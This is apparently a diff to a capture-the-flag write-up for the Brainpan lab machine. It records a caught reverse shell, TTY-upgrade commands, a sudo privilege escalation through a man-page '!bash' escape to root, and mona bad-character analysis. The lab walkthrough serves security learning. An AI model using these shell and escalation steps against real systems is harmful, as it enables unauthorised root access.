@@ -169,6 +169,24 @@ except:
 ```
 ### Reverse shell success
 ```
+└─$ rlwrap nc -lnvp 7777                 
+listening on [any] 7777 ...
+connect to [Attacker_IP] from (UNKNOWN) [Target_IP] 42772
+CMD Version 1.4.1
+
+Z:\home\puck>whoami
+File not found.
+
+Z:\home\puck>echo %USERNAME%
+puck
+
+Z:\home\puck>ver
+
+CMD Version 1.4.1
+
+Z:\home\puck>tasklist
+File not found.
+
 Z:\home\puck>dir
 Volume in drive Z has no label.
 Volume Serial Number is 0000-0000
@@ -177,8 +195,7 @@ Directory of Z:\home\puck
 ...
   3/6/2013   3:23 PM           513  checksrv.sh
   3/4/2013   2:45 PM  <DIR>         web
-       1 file                       513 bytes
-       3 directories     13,805,817,856 bytes free
+...
 
 # 2 thingds of interest:
 #      - web directory that held same web page content shown in browser on port 10000
@@ -209,18 +226,82 @@ if [[ $? -eq 1 ]]; then
         /usr/bin/python -m SimpleHTTPServer 10000
 fi 
 ```
+Realised as soon as /home/ at start of directory structure I needed to replace the shellcode with linux alternative, so here is another attempt with better suited and less limited shell.
+```
+└─$ rlwrap nc -lnvp 7777                 
+listening on [any] 7777 ...
+connect to [Attacker_IP] from (UNKNOWN) [Target_IP] 34456
+whoami
+puck
+ps
+  PID TTY          TIME CMD
+  883 ?        00:00:00 sh
+  884 ?        00:00:00 checksrv.sh
+  896 ?        00:00:00 python
+  998 ?        00:00:00 sh
+ 1056 ?        00:00:00 brainpan.exe
+ 1060 ?        00:00:00 wineserver
+ 1066 ?        00:00:00 services.exe
+ 1070 ?        00:00:00 winedevice.exe
+ 1080 ?        00:00:00 plugplay.exe
+ 1088 ?        00:00:00 ps
+```
 
-### Mona Commands some interesting too look into
+# Gained a better shell experience with
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + z                                                                                             
+stty raw -echo;fg                                 
+reset              <--- reset leads to terminal type question
+
+reset: unknown terminal type unknown
+Terminal type? 
+xterm              <--- type exterm as response
+
+#back in shell next set export variables
+export TERM=xterm
+export SHELL=bash
+
+```
+puck@brainpan:/home/puck$ sudo -l
+sudo -l
+Matching Defaults entries for puck on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
+
+sudo /home/anansi/bin/anansi_util
+Usage: /home/anansi/bin/anansi_util [action]
+Where [action] is one of:
+  - network
+  - proclist
+  - manual [command]
+```
+Network option is ifconfig, proclist is TOP and manual is man command. GTFObins shows that only man and top has an interactive shell. Man command GTFObins suggestion shows an unprivileged, sudo or suid option all using: 
+```
+man '-H/bin/sh #' man
+```
+Because this system’s man does NOT support the -H HTML‑browser escape, so the GTFOBins trick is not applicable on this machine. Another alternative that works here is use:
+/home/anansi/bin/anasi_util manual man 
+then enter to get root shell:
+!bash
+
+then check whoami shows root.
+
+```
+root@brainpan:/usr/share/man# whoami
+whoami
+root
+```
+
+TOP commmand option won't work as it requires procps-ng (top version), which is not present.
+
+### 2 Alternat Mona Commands 
 1. !mona bytearray -b "\x00"
 Purpose:  
-Generate a full test bytearray (\x01 → \xff) excluding known bad chars.
-
-Why:  
-You send this into the vulnerable program to detect bad characters — bytes that get altered, removed, or terminate the buffer.
-
-In Brainpan:  
-Only \x00 is bad.
-Everything else survives unchanged.
+Generate a full test bytearray (\x01 → \xff) excluding known bad chars. This made more sense than re-using a file that I copied them previously fromm, it offers ready to use python code containing all bad char.
 
 2. !mona compare -f C:\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.bin -a ESP
 Purpose:  
@@ -241,30 +322,12 @@ Only 1 original bytes of 'normal' code found.
     |00 00 4f 00 00 00 4f 00 00 00 00 00 00 00 4f 00| Memory
  10 |11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20| File
     |08 ef 28 00 5d 76 a0 77 01 00 00 00 00 00 4f 00| Memory
- 20 |21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30| File
-    |00 00 00 00 0f 6c 9c 77 00 00 4f 00 01 00 00 00| Memory
- 30 |31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40| File
-    |00 00 4f 00 00 00 00 00 5c ef 28 00 32 00 00 00| Memory
+... Too repetive to include it all.
  40 |41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50| File
     |82 85 96 77 00 00 4f 00 95 ad 9a 77 f8 3b    00| Memory
  50 |51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60| File
     |02 00 04 06 b1 1a 96 77 54 00 04 50 38 00 00 00| Memory
- 60 |61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70| File
-    |30 00 00 00 48 9d 4f 00 c0 00 4f 00 7f 00 00 00| Memory
- 70 |71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80| File
-    |8c 02 4f 00 20 00 00 00 00 00 4f 00 54 00 00 00| Memory
- 80 |81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90| File
-    |6c ef 28 00 00 00 00 00 a0 d6 9b 77 a0 01 00 00| Memory
- 90 |91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0| File
-    |fe ff ff ff 5a 68 a0 77 d8 9e 4f 00 f8 3b 4f 00| Memory
- a0 |a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0| File
-    |00 00 00 00 90 02 00 00 54 00 00 00 f8 3b 4f 00| Memory
- b0 |b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0| File
-    |01 00 00 01 c0 00 4f 00 00 00 00 00 34 00 00 00| Memory
- c0 |c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0| File
-    |01 00 00 00 01 00 00 00 00 00 00 00 54 00 00 00| Memory
- d0 |d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0| File
-    |40 9d 4f 00 42 9d 4f 00 48 9d 4f 00 6b 01 10 50| Memory
+...
  e0 |e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0| File
     |40 9d 4f 00 48 9d 4f 00 e4 03 4f 00 00 00 04 04| Memory
  f0 |f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff   | File
@@ -280,21 +343,4 @@ Only 1 original bytes of 'normal' code found.
 First mismatching byte: 01
 Possibly bad chars: 01
 Bytes omitted from input: 00
-```
-### Reverse shell initial connection:
-
-```
-┌──(hacktopuser㉿hacktop)-[~]
-└─$ nc -lnvp 7777              
-listening on [any] 7777 ...
-connect to [192.168.159.255] from (UNKNOWN) [10.49.167.39] 42024
-CMD Version 1.4.1
-
-Z:\home\puck>dir
-...
-  3/6/2013   3:23 PM           513  checksrv.sh
-  3/4/2013   2:45 PM  <DIR>         web
-       1 file                       513 bytes
-       3 directories     13,805,817,856 bytes free
-...
 ```
